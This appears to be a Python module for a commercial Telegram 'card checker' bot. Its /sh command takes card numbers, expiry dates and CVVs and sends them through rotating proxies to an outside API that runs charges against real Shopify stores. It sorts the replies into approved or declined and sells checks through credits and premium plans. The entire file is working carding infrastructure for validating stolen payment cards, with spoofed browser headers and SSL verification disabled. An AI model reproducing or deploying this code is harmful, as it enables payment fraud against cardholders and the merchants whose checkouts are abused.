import aiohttp
import asyncio
import time
import re
import json
import random
from html import escape
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CommandHandler, ContextTypes
from config import (
    get_bin_info, kb_result, OWNER_ID, FORCE_CHANNELS,
    SUPPORT_LINK, API_TIMEOUT, E_LIVE, E_DECLINED, E_ERRORS,
    E_GATE, E_CARD, E_USER, E_TIME
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 🛒 SHOPIFY API  (goshopi.up.railway.app)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SHOPII_API = "https://goshopi.up.railway.app/shopii"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOADERS  (sites.txt / px.txt)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _clean_site(raw: str) -> str:
    """Strip protocol, www, trailing slashes — API needs plain domain only."""
    s = raw.strip().lower()
    for prefix in ("https://", "http://", "www."):
        if s.startswith(prefix):
            s = s[len(prefix):]
    return s.rstrip("/")

def load_sites() -> list[str]:
    try:
        with open("sites.txt") as f:
            sites = [_clean_site(l) for l in f if l.strip() and not l.startswith("#")]
        if sites:
            return sites
    except FileNotFoundError:
        pass
    return ["1898-products.myshopify.com", "anotherseasonwaco.myshopify.com"]

def load_proxies() -> list[str]:
    try:
        with open("px.txt") as f:
            return [l.strip() for l in f if l.strip() and not l.startswith("#")]
    except FileNotFoundError:
        return []

SITES   = load_sites()
PROXIES = load_proxies()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# USER DATA
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def get_user_data(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> dict:
    uid = str(user_id)
    if "user_data" not in context.bot_data:
        context.bot_data["user_data"] = {}
    if uid not in context.bot_data["user_data"]:
        context.bot_data["user_data"][uid] = {
            "name": "User", "credits": 150, "plan": "TRIAL",
            "expires": 0, "pre_premium_credits": 0,
        }
    return context.bot_data["user_data"][uid]

def is_user_premium(ud: dict) -> bool:
    if ud.get("plan", "TRIAL").upper() == "TRIAL":
        return False
    if ud.get("expires", 0) <= time.time():
        ud.update({"plan": "TRIAL", "credits": ud.get("pre_premium_credits", 150), "expires": 0})
        return False
    return True

def get_styled_plan(raw: str) -> str:
    return {"CORE": "✨ Cᴏʀᴇ ✨", "ELITE": "⭐ Eʟɪᴛᴇ ⭐", "ROOT": "👑 Rᴏᴏᴛ 👑"}.get(raw.upper(), "Tʀɪᴀʟ")

async def _check_force_sub(user_id: int, context) -> list:
    if user_id == OWNER_ID:
        return []
    not_joined = []
    for name, link in FORCE_CHANNELS:
        try:
            m = await context.bot.get_chat_member(f"@{name}", user_id)
            if m.status in ("left", "kicked"):
                not_joined.append((name, link))
        except Exception:
            pass
    return not_joined

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# REAL API CALL — never returns fast, waits for goshopi
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def call_shopii(cc: str, month: str, year: str, cvv: str,
                      site: str, proxy: str | None) -> str:
    """
    Hits the real goshopi API and returns the raw response string
    exactly as received. Never modifies, filters, or truncates it.
    Raises on network failure so caller can show the real error.
    """
    # API requires full 4-digit year
    if len(year) == 2:
        year = "20" + year

    params: dict[str, str] = {
        "cc":   f"{cc}|{month}|{year}|{cvv}",
        "site": site,
    }
    if proxy:
        params["proxy"] = proxy

    timeout = aiohttp.ClientTimeout(
        total=API_TIMEOUT,    # 120 s from config — enough for real Shopify checkout
        connect=15,
        sock_read=API_TIMEOUT,
    )
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "Accept": "application/json, text/plain, */*",
    }

    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(
        timeout=timeout, headers=headers, connector=connector
    ) as session:
        async with session.get(SHOPII_API, params=params) as resp:
            # Read FULL body — never cut short
            raw_bytes = await resp.read()
            raw_text  = raw_bytes.decode("utf-8", errors="replace").strip()

            # Pretty-print JSON if valid, otherwise keep raw string
            try:
                parsed   = json.loads(raw_text)
                raw_text = json.dumps(parsed, ensure_ascii=False, separators=(",", ":"))
            except Exception:
                pass

    return raw_text


def classify(raw: str) -> str:
    """
    Returns "APPROVED" / "DECLINED" / "UNKNOWN".
    Only reads what the API actually said — never assumes.
    """
    t = raw.lower()
    for kw in ("approved", "approval", "success", "charged", "captured",
               "payment approved", "transaction approved", "paid"):
        if kw in t:
            return "APPROVED"
    for kw in ("declined", "decline", "failed", "failure", "invalid",
               "do not honor", "do_not_honor", "card_declined",
               "generic_decline", "insufficient", "expired",
               "incorrect_cvc", "stolen", "blocked", "error"):
        if kw in t:
            return "DECLINED"
    return "UNKNOWN"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# /sh HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user

    if context.bot_data.get("maintenance") and user.id != OWNER_ID:
        await update.message.reply_text("⚠️ Bot is under maintenance. Try again later.")
        return

    if not context.bot_data.get("sh_on", True):
        await update.message.reply_text(
            "⚠️ Sʜᴏᴘɪꜰʏ gate is currently <b>OFF</b>.", parse_mode="HTML"
        )
        return

    not_joined = await _check_force_sub(user.id, context)
    if not_joined:
        rows = [[InlineKeyboardButton(f"➺ Join @{n}", url=l)] for n, l in not_joined]
        rows.append([InlineKeyboardButton("✅ I Joined — Verify Now", callback_data="check_sub")])
        await update.message.reply_text(
            "<b>[ 𖥷iТ ] ➺ Jᴏɪɴ Rᴇǫᴜɪʀᴇᴅ</b>\n"
            "━━━━━━━━━━━━━━━━━\n"
            "Join our channel & group to use this bot.\n"
            "━━━━━━━━━━━━━━━━━",
            reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML",
        )
        return

    # ── Parse card ──
    card_str = None
    if context.args:
        card_str = context.args[0].strip()
    elif update.message.reply_to_message:
        rt = (update.message.reply_to_message.text
              or update.message.reply_to_message.caption or "")
        m = re.search(
            r'(\d{13,19})\s*[|,;\s]\s*(\d{1,2})\s*[|,;\s]\s*(\d{2,4})\s*[|,;\s]\s*(\d{3,4})', rt
        )
        if m:
            card_str = f"{m.group(1)}|{m.group(2)}|{m.group(3)}|{m.group(4)}"
        else:
            m2 = re.search(r'\b(\d{13,19})\b', rt)
            if m2:
                card_str = m2.group(1)

    if not card_str:
        await update.message.reply_text(
            "⚠️ <b>Uꜱᴀɢᴇ:</b>\n<code>/sh cc|mm|yy|cvv</code>\n\n"
            "<b>Example:</b>\n<code>/sh 4111111111111111|12|26|123</code>",
            parse_mode="HTML",
        )
        return

    parts = card_str.split("|")
    if len(parts) != 4:
        await update.message.reply_text(
            "❌ Invalid format. Use: <code>cc|mm|yy|cvv</code>", parse_mode="HTML"
        )
        return

    cc_num, mm, yy, cvv = [p.strip() for p in parts]

    # ── Credits ──
    ud      = get_user_data(user.id, context)
    premium = is_user_premium(ud)

    if not premium:
        if ud.get("credits", 0) <= 0:
            await update.message.reply_text(
                "<b>[ 𖥷iТ ] ➺ Nᴏ Cʀᴇᴅɪᴛꜱ ❌</b>\n"
                "━━━━━━━━━━━━━━━━━\n"
                "You have no credits left.\n"
                "Redeem a code with /rm or buy a plan.\n"
                "━━━━━━━━━━━━━━━━━",
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("💎 BUY PREMIUM", callback_data="mprice")],
                    [InlineKeyboardButton("📞 Support", url=SUPPORT_LINK)],
                ]),
            )
            return
        ud["credits"] -= 1

    site_used  = random.choice(SITES)
    proxy      = random.choice(PROXIES) if PROXIES else None
    start_time = time.time()
    bin_num    = cc_num[:6]

    msg = await update.message.reply_text(
        f"{E_GATE} <b>[ 𖥷iТ ] ➺ Cʜᴇᴄᴋɪɴɢ Sʜᴏᴘɪꜰʏ...</b>\n"
        f"🌐 <code>{escape(site_used)}</code>\n"
        f"⏳ Hitting real API — please wait...",
        parse_mode="HTML",
    )

    try:
        # API call + BIN lookup run at the same time
        api_task = asyncio.create_task(
            call_shopii(cc_num, mm, yy, cvv, site_used, proxy)
        )
        bin_task = asyncio.create_task(get_bin_info(bin_num))

        results    = await asyncio.gather(api_task, bin_task, return_exceptions=True)
        api_result = results[0]
        bin_data   = results[1] if not isinstance(results[1], Exception) else {"error": True}

        # If API itself threw an exception, re-raise it
        if isinstance(api_result, Exception):
            raise api_result

        raw_response = api_result   # full, real, unmodified API text

        # Classify purely from API words
        status = classify(raw_response)
        if status == "APPROVED":
            status_ui = f"{E_LIVE} Aᴘᴘʀᴏᴠᴇᴅ ✅"
        elif status == "DECLINED":
            status_ui = f"{E_DECLINED} Dᴇᴄʟɪɴᴇᴅ ❌"
        else:
            status_ui = f"{E_ERRORS} Uɴᴋɴᴏᴡɴ ⚠️"

        # BIN display
        bin_txt = "N/A"
        country = "N/A"
        flag    = ""
        if not bin_data.get("error"):
            s       = str(bin_data.get("scheme",  "")).upper() or "N/A"
            t       = str(bin_data.get("type",    "")).upper() or "N/A"
            b       = bin_data.get("bank", "N/A")
            country = str(bin_data.get("country", "N/A")).upper()
            flag    = bin_data.get("country_emoji", "")
            bin_txt = f"{s} - {t} - {b}"

        time_taken = f"{time.time() - start_time:.2f}"
        plan_ui    = get_styled_plan(ud.get("plan", "TRIAL"))
        username   = escape(user.first_name or "User")
        safe_resp  = escape(raw_response)   # full real API response, HTML-safe
        safe_proxy = escape(proxy or "None")

        text = (
            f"<b>[ 𖥷iТ ] ➺ {status_ui}</b>\n"
            f"{E_CARD} ➺ <code>{escape(card_str)}</code>\n"
            f"{E_GATE} Gᴀᴛᴇ ➺ Sʜᴏᴘɪꜰʏ 🛒\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"🌐 𝗦𝗜𝗧𝗘  ➺ <code>{escape(site_used)}</code>\n"
            f"🔒 𝗣𝗥𝗢𝗫𝗬 ➺ <code>{safe_proxy}</code>\n"
            f"📜 𝗥𝗘𝗦𝗣  ➺ <code>{safe_resp}</code>\n"
            f"{E_TIME} 𝗧𝗜𝗠𝗘  ➺ {time_taken}s\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"🏦 𝗕𝗜𝗡    ➺ {bin_txt}\n"
            f"🌍 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ➺ {flag} {country}\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"{E_USER} 𝗨𝘀𝗲𝗿  ➺ {username} ({plan_ui})\n"
            f"📢 @Batcardchk"
        )

        await msg.edit_text(
            text, parse_mode="HTML",
            reply_markup=kb_result(premium),
            disable_web_page_preview=True,
        )

    except asyncio.TimeoutError:
        if not premium:
            ud["credits"] = ud.get("credits", 0) + 1
        await msg.edit_text(
            f"{E_ERRORS} <b>[ 𖥷iТ ] ➺ Tɪᴍᴇᴏᴜᴛ ❌</b>\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"🌐 Site: <code>{escape(site_used)}</code>\n"
            f"⏱️ Waited {API_TIMEOUT}s — site did not respond.\n"
            f"Try again or change the site in sites.txt\n"
            f"━━━━━━━━━━━━━━━━━",
            parse_mode="HTML",
        )

    except aiohttp.ClientConnectorError as e:
        if not premium:
            ud["credits"] = ud.get("credits", 0) + 1
        await msg.edit_text(
            f"{E_ERRORS} <b>[ 𖥷iТ ] ➺ Cᴏɴɴᴇᴄᴛɪᴏɴ Fᴀɪʟᴇᴅ ❌</b>\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"<code>{escape(str(e)[:250])}</code>\n"
            f"━━━━━━━━━━━━━━━━━",
            parse_mode="HTML",
        )

    except Exception as e:
        if not premium:
            ud["credits"] = ud.get("credits", 0) + 1
        # Show the exact error type and detail — never hide what went wrong
        await msg.edit_text(
            f"{E_ERRORS} <b>[ 𖥷iТ ] ➺ Eʀʀᴏʀ ❌</b>\n"
            f"━━━━━━━━━━━━━━━━━\n"
            f"<b>Type:</b> <code>{escape(type(e).__name__)}</code>\n"
            f"<b>Detail:</b> <code>{escape(str(e)[:250])}</code>\n"
            f"━━━━━━━━━━━━━━━━━",
            parse_mode="HTML",
        )


def get_sh_handler():
    return CommandHandler("sh", cmd_sh)
